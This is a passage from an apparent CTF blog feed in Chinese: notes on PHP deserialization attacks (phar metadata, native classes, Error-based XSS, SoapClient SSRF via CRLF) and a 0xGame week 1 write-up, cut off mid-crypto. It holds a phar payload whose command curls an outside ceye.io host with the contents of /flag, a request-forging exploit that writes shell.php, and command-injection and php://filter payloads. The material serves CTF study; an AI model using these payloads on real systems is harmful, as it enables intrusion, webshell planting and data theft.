class="line"></span><br></pre></td></tr></table></figure><p>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</p><p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，基本上能使用伪协议的文件操作函数都能触发反序列化。</p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/phar_1_1.png"></p><p><strong>Phar反序列化漏洞利用</strong></p><p>既然很多函数可以触发phar反序列化，那么接下来就要实际利用该漏洞</p><p>Phar反序列化不会调用 <code>weakup </code>等方法</p><p>可以在不调用<code>unserialize()</code>的情况下进行反序列化操作。</p><p><strong>漏洞利用条件</strong></p><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</li></ol><p>phar文件生成样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;curl http://kbqsag.ceye.io/?p=`cat /flag`&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);    <span class="comment">//设置Stub</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);    <span class="comment">//设置Meta-data</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);    <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="小技巧-特性"><a href="#小技巧-特性" class="headerlink" title="小技巧&#x2F;特性"></a>小技巧&#x2F;特性</h1><h2 id="十六进制绕过关键字"><a href="#十六进制绕过关键字" class="headerlink" title="十六进制绕过关键字"></a>十六进制绕过关键字</h2><p>php反序列化是可以使用16进制的，只需要把类型小<code>s</code>改成大<code>S</code>。</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_1_1.png"></p><p><code>t</code>的16进制是<code>\74</code>，把<code>s</code>改成<code>S</code>时，便能将<code>\74</code>解析成<code>t</code>。</p><h2 id="类名大小写不敏感"><a href="#类名大小写不敏感" class="headerlink" title="类名大小写不敏感"></a>类名大小写不敏感</h2><p>php对于类名大小写不敏感，也就是说，<code>A</code>和<code>a</code>都会认为是同一个类。</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__destruct1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_2_1.png"></p><h2 id="类内方法调用"><a href="#类内方法调用" class="headerlink" title="类内方法调用"></a>类内方法调用</h2><p>样例代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态调用类<code>A</code>的<code>test</code>方法:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">A::<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;test&#x27;</span>]();</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_3_1.png"></p><p>动态调用类<code>A</code>的<code>test</code>方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>())::<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>())-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line">[<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(),<span class="string">&#x27;test&#x27;</span>]();</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_3_2.png"></p><h1 id="原生类相关"><a href="#原生类相关" class="headerlink" title="原生类相关"></a>原生类相关</h1><h2 id="C开头"><a href="#C开头" class="headerlink" title="C开头"></a>C开头</h2><p>绕 <code>wakeup</code> 和绕 <code>/^[Oa]:[/d]+/</code> 过滤。</p><p>详细可以看 <code>wakeup</code> 绕过总结的 <code>使用C绕过</code>。</p><p>以C开头的原生类：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplDoublyLinkedList::unserialize</span><br><span class="line">SplQueue::unserialize</span><br><span class="line">SplStack::unserialize</span><br><span class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><ul><li><h2 id="遍历文件目录类"><a href="#遍历文件目录类" class="headerlink" title="遍历文件目录类"></a>遍历文件目录类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DirectoryIterator </span><br><span class="line">FilesystemIterator </span><br><span class="line">GlobIterator </span><br></pre></td></tr></table></figure><p>这三个都可以遍历文件目录，可以搭配伪协议使用。</p><p>可以用<code>glob://</code>且配合<code>*</code>查找。</p><p>注意，这几个类不能反序列化。</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$a</span> )&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_2_1.png"></p></li><li><h2 id="读文件内容"><a href="#读文件内容" class="headerlink" title="读文件内容"></a>读文件内容</h2><p><strong>SplFileObject</strong></p><p>当用文件目录遍历到了敏感文件时，可以用<strong>SplFileObject</strong>类，<strong>SplFileInfo</strong> 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作。</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$text</span>= <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;./flag.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$text</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_2_2.png"></p></li></ul><h2 id="hash绕过和XSS实现"><a href="#hash绕过和XSS实现" class="headerlink" title="hash绕过和XSS实现"></a>hash绕过和XSS实现</h2><p>这里主要是用原生类<code>Error</code>和<code>Exception</code>来实现。</p><p>它们两个的用法是一样的，这里以<code>Error</code>类作为例子讲解</p><p>Error中也有个<code>__toString()</code>，可以控制它的内容实现字符串的输出。</p><p>Error可以传两个参数，有个参数值的不同则对象不同也就不相等，但对由于<code>__toString()</code>返回的值相同md5和sha1加密后也相同，最后得到的数据也是一样的，所以可以达到hash绕过。</p><ul><li><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>])</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss test&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//  O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A34%3A%22%3Cscript%3Ealert%28%27xss+test%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A27%3A%22W%3A%5Cphpstudy_pro%5CWWW%5C114.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_3_1.png"></p></li><li><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;test&quot;</span>,<span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> !== <span class="variable">$b</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$a != $b&#x27;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5相等&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8E%9F%E7%94%9F%E7%B1%BB_3_2.png"></p></li></ul><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>利用<code>SoapClient</code>原生类的 <code>__call</code>方法进行<code>SSRF</code>。</p><p>使用前提：</p><ol><li>需要有soap扩展，且不是默认开启，需要手动开启</li><li>需要调用一个不存在的方法触发其__call()函数</li><li>仅限于http&#x2F;https协议</li></ol><p>正常情况下的<code>SoapClient</code>类，调用一个不存在的函数，会去调用<code>__call</code>方法。</p><p><strong>CRLF攻击</strong></p><p>什么是CRLF，其实就是回车和换行造成的漏洞，十六进制为<code>0x0d,0x0a</code> ，在HTTP当中<code>header</code>和<code>body</code>之间就是两个CRLF分割的，所以如果我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以crlf injection 又叫做 HTTP Response Splitting。</p><p><code>SoapClient</code> 在调用发送数据时，存在CRLF漏洞，因此我们可以通过控制其中一个http头来构造出我们想要的请求包。</p><p><code>Content-Length</code>是HTTP消息长度，它指定多少个字符，就读取多少个字符，多余的字符会被丢弃，所以可以通过控制<code>Content-Length</code>的长度，将没用的消息忽略掉。</p><p>使用SoapClient反序列化+CRLF <strong>可以生成任意POST请求</strong> 。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 填入post的数据 </span></span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;a=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#x27;</span>;</span><br><span class="line"><span class="comment">// 填入你想要的http头</span></span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: aaaa=ssss&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_agent</span> = <span class="string">&#x27;aaa^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt; <span class="variable">$user_agent</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>, <span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;%26&#x27;</span>, <span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHP反序列化中wakeup()绕过总结</a></p><p><a href="https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD/Qb5uDAhaDcC7FeD&alichlgref=https://cn.bing.com/">浅析PHP GC垃圾回收机制及常见利用方式</a></p><p><a href="https://zhuanlan.zhihu.com/p/405838002">PHP序列化冷知识</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247487933&idx=1&sn=e57bc3583c1b80f1aa7bd08409cfb82d">从qwb webshell 题深入快速析构</a></p><p><a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">愚人杯3rd [easy_php]</a></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/123859246">PHP之序列化与反序列化（原生类应用篇上）</a></p><p><a href="https://dar1in9s.github.io/2020/04/02/php/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">PHP原生类的反序列化利用</a></p><p><a href="https://blog.csdn.net/qq_43632414/article/details/120499159">PHP反序列化——字符逃逸漏洞（肯定能看懂的！）</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> PHP </category>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
            <tag> 知识库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame_week1</title>
      <link href="/0xGame-week1/"/>
      <url>/0xGame-week1/</url>
      
        <content type="html"><![CDATA[<h1 id="0xGame-week1"><a href="#0xGame-week1" class="headerlink" title="0xGame_week1"></a>0xGame_week1</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>F12，点击源代码&#x2F;来源，查看js文件，即可得到flag。</p><p><img src="/0xGame-week1/w_2_1.png"></p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>查看源码，看到提示。</p><p><img src="/0xGame-week1/w_1_1.png"></p><p>按照提示访问<code>/api.php?source</code>，即可得到源码 。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;No IP Address&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">sanitize</span>(<span class="variable">$ip</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid IP Address&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ping -c 4 &#x27;</span>.<span class="variable">$ip</span>. <span class="string">&#x27; 2&gt;&amp;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由源码可知，过滤了<code>flag</code>、<code>;</code>、<code> 空格( )</code>、<code>/</code>。</p><p>使用 <code>回车(%0a)</code> 代替<code>;</code>截断命令。用 <code>tab(%09)</code> 代替空格，使用cd命令一直跳转到根目录即可查看flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1%0acd%09..%0acd%09..%0acd%09..%0acat%09f*%0a</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/w_1_2.png"></p><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用数组绕md5，用小数+字符绕过<code>if (!is_numeric($c) &amp;&amp; $c != 1024 &amp;&amp; intval($c) == 1024)</code>，用伪协议读flag.php，base64解码后即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get: url/?a[]=1&amp;b[]=2</span><br><span class="line">post: c=1024.11a</span><br><span class="line">cookie: name=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/w_3_1.png"></p><h2 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h2><ol><li><p>get传<code>query=ctf</code>;</p></li><li><p>post传<code>action=getflag</code>;</p></li><li><p>cookie传<code>role=admin</code>；</p></li><li><p>添加<code>X-Forwarded-For: 127.0.0.1</code>;</p></li><li><p>修改<code>User-Agent</code>为<code>HarmonyOS Browser</code>；</p></li><li><p>添加<code>Referer: ys.mihoyo.com</code>。</p><p><img src="/0xGame-week1/w_4_1.png"></p></li></ol><h2 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h2><p>用<code>dirsearch</code>扫描，发现有<code>.git</code>泄露。</p><p>使用 <a href="https://github.com/BugScanTeam/GitHack#githack">GitHack</a> 下载源码。</p><p><img src="/0xGame-week1/w_5_1.png"></p><p>然后进入<code>dist/124.71.184.68_50013</code>，打开终端，输入<code>git log</code>，可以看到历史版本。</p><p><img src="/0xGame-week1/w_5_2.png"></p><p>输入<code>git show</code>，即可找到flag。</p><p><img src="/0xGame-week1/w_5_3.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="BabyRSA"><a href="#BabyRSA" class="headerlink" title="BabyRSA"></a>BabyRSA</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getN</span>():</span><br><span class="line">N = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">tmp = getPrime(<span class="number">32</span>)</span><br><span class="line">N *= tmp</span><br><span class="line"><span class="keyword">return</span> N</span><br><span class="line"></span><br><span class="line">mask = getrandbits(<span class="number">256</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = getN()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m*mask,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span 